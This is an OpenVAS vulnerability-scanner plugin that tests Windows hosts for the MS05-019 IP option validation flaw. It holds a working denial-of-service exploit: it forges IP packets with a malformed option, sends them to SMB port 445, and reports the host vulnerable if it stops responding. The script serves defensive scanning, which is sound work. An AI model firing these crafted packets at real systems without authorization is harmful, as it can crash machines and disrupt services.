###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ms_windows_ip_validation_code_exec_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Microsoft Windows Internet Protocol Validation Remote Code Execution Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_affected = "Microsoft Windows XP SP2 and prior.
  Microsoft Windows 2000 Server SP4 and prior.

  Run Windows Update and update the listed hotfixes or download and
  update mentioned hotfixes in the advisory from the below link,
  http://technet.microsoft.com/en-us/security/bulletin/ms05-019";

tag_impact = "Successful exploitation will allow attacker to cause a denial of service
  and possibly execute arbitrary code via crafted IP packets with malformed
  options.
  Impact Level: System";
tag_insight = "The flaw is due to insufficient validation of IP options and can be
  exploited to cause a vulnerable system to stop responding and restart or may
  allow execution of arbitrary code by sending a specially crafted IP packet
  to a vulnerable system.";
tag_summary = "The host is running Microsoft Windows and is prone to remote code
  execution vulnerability.";

if(description)
{
  script_id(902588);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2005-0048", "CVE-2005-0688", "CVE-2004-0790",
                "CVE-2004-1060", "CVE-2004-0230");
  script_bugtraq_id(13116, 13658, 13124, 10183);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-11-21 15:15:15 +0530 (Mon, 21 Nov 2011)");
  script_name("Microsoft Windows Internet Protocol Validation Remote Code Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected;

  script_xref(name : "URL" , value : "http://secunia.com/advisories/14512");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/22341");
  script_xref(name : "URL" , value : "http://securitytracker.com/id/1013686");
  script_xref(name : "URL" , value : "http://technet.microsoft.com/en-us/security/bulletin/ms05-019");
  script_xref(name : "URL" , value : "http://technet.microsoft.com/en-us/security/bulletin/ms06-064");

  script_description(desc);
  script_summary("Determine Internet Protocol Validation Remote Code Execution Vulnerability");
  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Windows : Microsoft Bulletins");
  script_require_ports(139, 445);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("smb_nt.inc");

if(TARGET_IS_IPV6()){
  exit(0);
}

## Get SMB Port
port = kb_smb_transport();
if(!port) {
  port = 445;
}

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Building Exploit
dstaddr = get_host_ip();
srcaddr = this_host();
sport = rand() % (65536 - 1024) + 1024;

## IP packet with an option size 39
options = raw_string(0x03, 0x27, crap(data:"G", length:38));

ip = forge_ip_packet( ip_v   : 4,
                      ip_hl  : 15,
                      ip_tos : 0,
                      ip_len : 20,
                      ip_id  : rand(),
                      ip_p   : IPPROTO_TCP,
                      ip_ttl : 64,
                      ip_off : 0,
                      ip_src : srcaddr,
                      data   : options );


tcp = forge_tcp_packet( ip       : ip,
                        th_sport : sport,
                        th_dport : port,
                        th_flags : TH_SYN,
                        th_seq   : rand(),
                        th_ack   : 0,
                        th_x2    : 0,
                        th_off   : 5,
                        th_win   : 512,
                        th_urp   : 0 );

## Sending Exploit
start_denial();
for( i = 0; i < 5 ; i ++ ) {
  result = send_packet(tcp,pcap_active:FALSE);
}
alive = end_denial();

## Confirm Host is Still Alive and Responding
if(! alive) {
  security_hole(port);
}
